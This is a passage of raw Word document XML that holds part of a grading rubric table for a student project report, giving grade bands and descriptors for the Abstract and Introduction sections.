                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>C+/C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B246A86" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>D+/D</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F174942" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>MF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B6233C2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>F</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="19243354" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="600"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2AF52BF3" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Abstract</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1AA3D8EE" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1AC5D929" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Fully describes purpose of project, methods </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>used</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> and results obtained</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3328C44D" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Describes purpose of project, methods </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>used</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> and results obtained</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3DFF7F9C" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Describes project purpose, methods </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>used</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> and results obtained in sketchy form</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0DCF6203" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Satisfactory description of project purpose, methods </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>used</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> and results obtained</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="67EFB480" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Unsatisfactory description of project purpose, with poor or missing methods and/or results</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71EC812B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Insufficient description of Project, with missing methods and/or results</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="17DCF73B" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="405"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1CD1D5CA" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Introduction</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="390369AB" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="52F9A34E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Sets excellent context for project. </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4DFACD8A" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Sets very good context for project.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29ABF7AF" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Sets good context for project. </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4549B22A" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Sets satisfactory context for project.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3744DAF0" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
